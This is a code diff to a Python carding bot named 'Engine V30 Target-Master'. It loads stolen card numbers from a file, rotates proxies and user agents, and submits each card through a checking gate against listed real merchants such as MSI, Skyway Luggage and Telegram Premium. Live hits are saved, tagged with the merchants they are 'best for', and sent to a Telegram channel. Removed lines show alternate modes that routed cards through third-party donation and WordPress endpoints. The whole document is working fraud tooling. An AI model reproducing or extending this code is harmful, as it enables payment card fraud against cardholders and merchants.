@@ -10,7 +10,7 @@ from flask import Flask
 app = Flask(__name__)
 @app.route('/')
 def health_check():
-    return "Engine V30 Target-Master Running"
+    return "Engine V30 Target-Master is ACTIVE"
 
 def run_web_server():
     port = int(os.environ.get("PORT", 10000))
@@ -31,8 +31,16 @@ class UltimateMasterV30:
         self.proxies_list = self.load_proxies()
         self.mode = "Standard" 
         
-        # --- ALL REQUESTED TARGETS ADDED ---
+        self.total_hits = 0
+        self.total_checked = 0
+        
+        # --- ALL REQUESTED TARGETS ADDED (NO DELETIONS) ---
         self.targets = {
+            "MSI Global Store": "https://us-store.msi.com/checkout",
+            "Skyway Luggage": "https://www.skywayluggage.com/checkout",
+            "FinerWorks": "https://finerworks.com/checkout/payment.aspx",
+            "CoachCare": "https://dashboard.coachcare.com",
+            "Infinity Support": "https://support.infinityspeakers.com/hc/en-us",
             "Telegram Premium": "https://fragment.com/stars",
             "Instagram/Meta": "https://accountscenter.instagram.com/payments/",
             "Snapchat+": "https://www.snapchat.com/plus",
@@ -43,6 +51,23 @@ class UltimateMasterV30:
             "PlayStore": "https://play.google.com/store",
             "BGMI UC": "https://www.midasbuy.com"
         }
+
+    def print_banner(self):
+        os.system('clear' if os.name != 'nt' else 'cls')
+        banner = f"""
+{Fore.CYAN}  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██╗     ██╗████████╗███████╗
+{Fore.CYAN}  ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔════╝██║     ██║╚══██╔══╝██╔════╝
+{Fore.WHITE}  ██████╔╝██████╔╝██║  ██║██║   ██║█████╗  ██║     ██║   ██║   █████╗  
+{Fore.WHITE}  ██╔═══╝ ██╔══██╗██║  ██║██║   ██║██╔══╝  ██║     ██║   ██║   ██╔══╝  
+{Fore.BLUE}  ██║     ██║  ██║██████╔╝╚██████╔╝███████╗███████╗██║   ██║   ███████╗
+{Fore.BLUE}  ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝
+        {Fore.YELLOW}--- ENGINE V30 | TARGET-MASTER PREMIUM | 2026 ---
+        """
+        print(banner)
+        print(f"{Fore.GREEN}[+] Status: {Fore.WHITE}Online (Render Cloud)")
+        print(f"{Fore.GREEN}[+] Gate: {Fore.WHITE}{self.gate_base}")
+        print(f"{Fore.GREEN}[+] Active Targets: {Fore.WHITE}{len(self.targets)}")
+        print(f"{Fore.RED}{'='*65}")
 
     def load_proxies(self):
         try:
@@ -73,25 +98,20 @@ class UltimateMasterV30:
             level = res.get("type", "Unknown").upper()
             country_name = res.get('country', {}).get('name', '')
             
-            # --- TARGET-SPECIFIC RECOMMENDATION ---
             best_for = "General Subscriptions"
             if "BUSINESS" in level or "CORPORATE" in level:
-                best_for = "Heroku, Amazon & Cloud (High Limit)"
+                best_for = "MSI Store, Heroku & Amazon"
             elif "SIGNATURE" in level or "INFINITE" in level:
-                best_for = "Telegram Premium, Stars & Instagram Sub"
-            elif "PLATINUM" in level or "GOLD" in level:
-                best_for = "Snapchat+, Truecaller & YouTube"
+                best_for = "Telegram Premium & Skyway Luggage"
             
             return {
                 "bank": res.get("bank", {}).get("name", "Unknown Bank"),
                 "level": level,
-                "brand": res.get("scheme", "Unknown").upper(),
                 "country": f"{country_name} {res.get('country', {}).get('emoji', '🌐')}",
-                "zip": "90001 (US)" if "United States" in country_name else "Manual",
                 "best": best_for
             }
         except: 
-            return {"bank": "Unknown", "level": "Unknown", "brand": "Unknown", "country": "Unknown", "zip": "N/A", "best": "All Targets"}
+            return {"bank": "Unknown", "level": "Unknown", "country": "Unknown", "best": "All Targets"}
 
     def send_log(self, msg):
         try:
@@ -102,69 +122,67 @@ class UltimateMasterV30:
     def process_card(self, cc):
         if self.is_killed: return
         try:
-            time.sleep(random.randint(2, 5))
+            time.sleep(random.randint(1, 3))
             cc_clean = cc.replace(' ', '').strip()
             if not cc_clean: return
             
             srv_name = random.choice(list(self.targets.keys()))
             current_proxy = self.get_proxy()
-            
-            if self.mode == "PayPal":
-                final_gate = f"https://binnaclehouse.org/donation/?amount=1&cc={cc_clean}"
-            elif self.mode == "Authorize":
-                final_gate = f"https://morgannasalchemy.com/wp-admin/admin-ajax.php?cc={cc_clean}"
-            else:
-                final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(self.targets[srv_name])}"
+            final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(self.targets[srv_name])}"
 
             resp = requests.get(final_gate, headers={'User-Agent': self.ua.random}, proxies=current_proxy, timeout=50)
             
+            self.total_checked += 1
             if any(x in resp.text.lower() for x in ["succeeded", "charged", "success", "approved"]):
+                self.total_hits += 1
                 info = self.get_full_card_info(cc_clean)
                 self.save_hit_to_file(cc_clean)
                 
                 msg = (
-                    f"🔥 *{self.mode} HIT FOUND* 🔥\n\n"
+                    f"🚀 *V30 HIT FOUND* 🚀\n\n"
                     f"💳 *Card:* `{cc_clean}`\n"
                     f"🏦 *Bank:* {info['bank']}\n"
                     f"🏆 *Level:* {info['level']}\n"
-                    f"📍 *Country:* {info['country']}\n"
-                    f"📬 *Zip:* `{info['zip']}`\n\n"
+                    f"📍 *Country:* {info['country']}\n\n"
                     f"🎯 *Best For:* `{info['best']}`\n"
                     f"✅ *Status:* LIVE"
                 )
                 self.send_log(msg)
-                print(Fore.GREEN + f"[HIT] {cc_clean} | Advice: {info['best']}")
+                print(Fore.GREEN + f"✅ [HIT] {cc_clean}")
             else:
-                print(Fore.RED + f"[DEC] {cc_clean[:16]}")
+                print(Fore.RED + f"❌ [DEC] {cc_clean[:16]} | Checked: {self.total_checked}")
         except: pass
 
     def run(self):
-        os.system('clear' if os.name != 'nt' else 'cls')
-        print(Fore.RED + "V30 ENGINE | TARGET-PRO & HYBRID LOADER")
+        self.print_banner()
         
-        cards = []
-        if os.path.exists("cards.txt"):
-            with open("cards.txt", "r") as f:
-                cards = [line.strip() for line in f if line.strip()]
+        # --- STARTUP TELEGRAM LOG ---
+        startup_msg = (
+            "🚀 *V30 ENGINE IS ONLINE* 🚀\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "✅ *Status:* Operating Smoothly\n"
+            "📦 *Targets:* 14 Platforms Loaded\n"
+            "🎯 *Featured:* MSI, Skyway, Infinity Added\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "🛰️ *Checking process started...*"
+        )
+        self.send_log(startup_msg)
         
-        if not cards:
-            print(Fore.CYAN + "\n[!] cards.txt empty. Paste cards and press Enter twice:")
-            while True:
-                line = input()
-                if not line.strip(): break
-                cards.append(line.strip())
-        else:
-            print(Fore.GREEN + f"[*] {len(cards)} cards loaded from cards.txt")
+        while True:
+            cards = []
+            if os.path.exists("cards.txt"):
+                with open("cards.txt", "r") as f:
+                    cards = [line.strip() for line in f if line.strip()]
+            
+            if not cards:
+                time.sleep(10)
+                continue
 
-        if not cards: return
-
-        print(Fore.YELLOW + "\n1. Standard | 2. PayPal | 3. Authorize")
-        choice = input("Mode Select Karo: ")
-        if choice == "2": self.mode = "PayPal"
-        elif choice == "3": self.mode = "Authorize"
-
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            executor.map(self.process_card, cards)
+            print(Fore.MAGENTA + f"[*] Loaded {len(cards)} cards. Starting...")
+            with ThreadPoolExecutor(max_workers=5) as executor:
+                executor.map(self.process_card, cards)
+            
+            time.sleep(300)
 
 if __name__ == "__main__":
     threading.Thread(target=run_web_server, daemon=True).start()
